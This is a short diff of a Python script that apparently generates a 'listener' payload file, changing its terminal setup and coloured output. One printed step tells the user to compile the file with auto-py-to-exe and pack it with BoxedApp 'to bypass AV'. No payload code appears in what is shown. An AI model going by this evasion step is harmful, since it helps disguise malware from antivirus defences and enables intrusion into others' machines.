@@ -3,6 +3,7 @@ from os import system
 import time
 import sys
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=24, cols=71))
+#sp.Popen("resize -s 24 71", stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
 system('clear')
 # terminal colors
 RED = "\033[1;31m"  
@@ -267,7 +268,8 @@ file=open(servername, 'wb')
 file.write(listener)
 file.close()
 print("{R}[{G}+{R}]{R} Listener{G} file {R}generated".format(R=RED, G=GREEN, N=NORMAL))
-print("Now you have to : \nCompile on a Windows with auto-py-to-exe\nBuild with BoxedApp packer to bypass AV")
+time.sleep(1)
+print("Now you have to : \n{Y}Compile on a {R}Windows {Y}with {R}auto-py-to-exe\nBuild{Y} with {R}BoxedApp{Y} packer to bypass AV".format(R=RED, Y=YELLOW))
 ''' TO ADD IN NEXT UPDATE
 compil=input("Would you like to compile payload into exe ? y/n ")
 if compil=="y":
